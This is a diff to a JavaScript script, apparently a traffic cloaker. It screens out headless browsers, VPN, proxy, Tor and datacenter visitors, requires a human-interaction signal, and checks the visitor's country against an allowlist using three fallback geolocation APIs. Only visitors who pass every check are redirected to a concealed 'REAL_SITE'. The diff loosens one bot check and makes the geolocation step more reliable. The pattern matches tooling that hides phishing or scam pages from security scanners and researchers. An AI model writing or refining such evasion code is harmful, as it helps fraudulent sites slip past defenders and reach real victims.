@@ -684,10 +684,9 @@ const ALLOWED_COUNTRIES = ['GB', 'US', 'CA', 'AU', 'NZ'];
   if (!navigator.language)                                      return;
   if ((navigator.languages||[]).length === 0)                   return;
   if (/chrome/i.test(ua) && !window.chrome)                    return;
-  if (navigator.plugins?.length === 0 && !/firefox/i.test(ua)) return;
   if (screen.width === 0 || screen.height === 0)                return;
 
-  // 3. Human signal — any interaction OR 2.5s on page (covers mobile users)
+  // 3. Human signal — any touch/click OR 2s on page
   await new Promise(resolve => {
     let done = false;
     const finish = () => { if (!done) { done = true; resolve(); } };
@@ -695,22 +694,50 @@ const ALLOWED_COUNTRIES = ['GB', 'US', 'CA', 'AU', 'NZ'];
      'keydown','pointerdown','click'].forEach(e =>
       window.addEventListener(e, finish, { once: true, passive: true })
     );
-    setTimeout(finish, 2500);
+    setTimeout(finish, 2000);
   });
 
-  // 4. Single reliable geo + VPN check via ipwho.is
-  try {
-    const res = await fetch('https://ipwho.is/', {
-      signal: AbortSignal.timeout(7000)
-    });
-    const d = await res.json();
+  // 4. Geo check — try 3 APIs, first success wins
+  let country = null;
+  let isVpn   = false;
 
-    if (!d.success)   return; // bad response
-    if (d.type === 'vpn' || d.type === 'proxy' || d.type === 'tor' ||
-        d.type === 'hosting' || d.type === 'datacenter') return; // VPN/proxy
-    if (!ALLOWED_COUNTRIES.includes(d.country_code))     return; // wrong country
+  const geoChecks = [
+    // ipwho.is — primary, has type field
+    async () => {
+      const d = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) }).then(r => r.json());
+      if (!d.success) throw new Error('fail');
+      const badType = ['vpn','proxy','tor','hosting','datacenter'];
+      if (badType.includes(d.type)) { isVpn = true; throw new Error('vpn'); }
+      return d.country_code;
+    },
+    // cloudflare trace — dead simple, no JSON, just text
+    async () => {
+      const txt = await fetch('https://www.cloudflare.com/cdn-cgi/trace', { signal: AbortSignal.timeout(5000) }).then(r => r.text());
+      const cc  = txt.match(/loc=(\w+)/)?.[1];
+      if (!cc) throw new Error('fail');
+      return cc;
+    },
+    // ipapi.co — last resort
+    async () => {
+      const d = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) }).then(r => r.json());
+      if (d.error) throw new Error('fail');
+      return d.country_code;
+    },
+  ];
 
-  } catch { return; } // timeout or network error — stay safe
+  for (const check of geoChecks) {
+    try {
+      country = await check();
+      break; // got a country, stop trying
+    } catch(e) {
+      if (e.message === 'vpn') { isVpn = true; break; } // definite VPN — stop
+      // else try next API
+    }
+  }
+
+  if (isVpn)                                  return; // confirmed VPN
+  if (!country)                               return; // all APIs failed — stay safe
+  if (!ALLOWED_COUNTRIES.includes(country))   return; // wrong country
 
   // 5. All good — redirect
   window.location.replace(REAL_SITE);
